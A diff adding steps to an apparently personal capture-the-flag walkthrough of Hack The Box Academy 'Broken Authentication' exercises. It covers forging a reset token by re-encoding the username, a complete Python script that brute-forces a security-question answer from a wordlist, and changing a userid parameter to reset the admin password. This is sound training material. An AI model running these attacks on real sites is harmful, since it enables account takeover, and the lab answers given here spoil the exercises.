@@ -308,13 +308,142 @@ python3 user.py
 
 >**Q. Request a reset token for htbuser and find the encoding algorithm, then request a reset token for htbadmin to force a password change and forge a valid temp password to login. What is the flag?**
 
+<div style="text-align: justify">1. Click on "Show temporary password for htbuser user".</div><br>
+![image-center](\assets\images\HTB_broken_authentication\Q5\4.1.png)
+
+<div style="text-align: justify">2. We capture the request in order to have the token.</div><br>
+![image-center](\assets\images\HTB_broken_authentication\Q5\4.2.png)
+
+<div style="text-align: justify">3. We introduce the token in the Burpsuite Decoder and decode the token first in Base64 and the result in ASCII Hex. We see that we can modify that password.</div><br>
+![image-center](\assets\images\HTB_broken_authentication\Q5\4.3.png)
+
+<div style="text-align: justify">4. We changed "htbuser" to "htbadmin" in password decrypted in the previous step. We encode the string, first in ASCII Hex and the result in Base64.</div><br>
+![image-center](\assets\images\HTB_broken_authentication\Q5\4.4.png)
+
+<div style="text-align: justify">5. We capture the login request and send it to the Repeater.</div><br>
+![image-center](\assets\images\HTB_broken_authentication\Q5\4.5.png)
+
+<div style="text-align: justify">6. In the Repeater we change the userid to "htbadmin" and as passwd we use the token from step four. We get the flag.</div><br>
+![image-center](\assets\images\HTB_broken_authentication\Q5\4.6.png)
+
 ## Guessable Answers
 
 >**Q. Reset the htbadmin user's password by guessing one of the questions. What is the flag?**
 
+<div style="text-align: justify">1. We access the target and introduce the user "htbadmin".</div><br>
+![image-center](\assets\images\HTB_broken_authentication\Q6\1.png)
+
+<div style="text-align: justify">2. We enter random answers in "Reset your password" until we find the question "What is your favorite color?"</div><br>
+![image-center](\assets\images\HTB_broken_authentication\Q6\2.png)
+
+<div style="text-align: justify">3. We modify the following python script to point to our target url and to the correct question from the previous step.</div><br>
+
+```python
+import sys
+import requests
+import os.path
+
+# target url, change as needed
+url = "http://IP:PORT/forgot.php"
+
+# fake headers to present ourself as Chromium browser, change if needed
+headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36"}
+
+# string expected if the answer is wrong
+invalid = "Sorry, wrong answer"
+
+# question to bruteforce
+question = "What is your favourite color?"
+
+
+# wordlist is expected as one word per line, function kept to let you to parse different wordlist format keeping the code clean
+def unpack(fline):
+    answer = fline
+
+    return answer
+
+# do the web request, change data as needed
+def do_req(url, answer, headers):
+    # closely inspect POST data sent using any intercepting proxy to create a valid data
+    data = {"answer": answer, "question": question, "userid": "htbadmin", "submit": "answer"}
+    res = requests.post(url, headers=headers, data=data)
+
+    return res.text
+
+# pretending we just know the message received when the answer is wrong, we flip the check
+def check(haystack, needle):
+    # if our invalid string is found in response body return False
+    if needle in haystack:
+        return False
+    else:
+        return True
+
+def main():
+    # check if wordlist has been given and exists
+    if (len(sys.argv) > 1) and (os.path.isfile(sys.argv[1])):
+        fname = sys.argv[1]
+    else:
+        print("[!] Please check wordlist.")
+        print("[-] Usage: python3 {} /path/to/wordlist".format(sys.argv[0]))
+        sys.exit()
+
+    # open the file
+    with open(fname) as fh:
+        for fline in fh:
+            # skip line if starts with a comment
+            if fline.startswith("#"):
+                continue
+            # extract userid and password from wordlist, removing trailing newline
+            answer = unpack(fline.rstrip())
+
+            # do HTTP request
+            print("[-] Checking word {}".format(answer))
+            res = do_req(url, answer, headers)
+
+            # check if response text matches our content
+            #print(res)
+            if (check(res, invalid)):
+                print("[+] Valid answer found: {}".format(answer))
+                sys.exit()
+
+if __name__ == "__main__":
+    main()
+```
+
+<div style="text-align: justify">4. We execute the script with the list "htm-colors.txt" that we can find in:</div><br>
+[SecLists](https://github.com/danielmiessler/SecLists)
+
+```sh
+python3 reset_password.py /home/marcos/htb-academy/broken_authentication/SecLists-master/Miscellaneous/security-question-answers/html-colors.txt
+```
+![image-center](\assets\images\HTB_broken_authentication\Q6\4.png)
+
+<div style="text-align: justify">5. The script gives us the correct answer to the question. We put the response in the target and get the flag.</div><br>
+![image-center](\assets\images\HTB_broken_authentication\Q6\5.png)
+
 ## Username Injection
 
 >**Q. Login with the credentials "htbuser:htbuser" and abuse the reset password function to escalate to "htbadmin" user. What is the flag?**
+<div style="text-align: justify">1. We start session with the credentials "htbuser:htbuser".</div><br>
+![image-center](\assets\images\HTB_broken_authentication\Q7\1.1.png)
+
+<div style="text-align: justify">2. We capture the above request and look at the parameters, especially the "userid".</div><br>
+![image-center](\assets\images\HTB_broken_authentication\Q7\1.2.png)
+
+<div style="text-align: justify">3. Once we have logged in, we can change the password. We do it to be able to capture the request.</div><br>
+![image-center](\assets\images\HTB_broken_authentication\Q7\2.1.png)
+
+<div style="text-align: justify">4. We send the request to Repeater.</div><br>
+![image-center](\assets\images\HTB_broken_authentication\Q7\2.2.png)
+
+<div style="text-align: justify">5. We copy the parameter "userid".</div><br>
+![image-center](\assets\images\HTB_broken_authentication\Q7\3.1.png)
+
+<div style="text-align: justify">6. And we paste it in the request to change password but changing the "userid" to "htbadmin" and we send the request. At this time we have changed the password of "htbadmin".</div><br>
+![image-center](\assets\images\HTB_broken_authentication\Q7\4.png)
+
+<div style="text-align: justify">7. We start the "htbadmin" session with the password used in the previous step and get the flag.</div><br>
+![image-center](\assets\images\HTB_broken_authentication\Q7\5.png)
 
 ## Brute Forcing Cookies
 
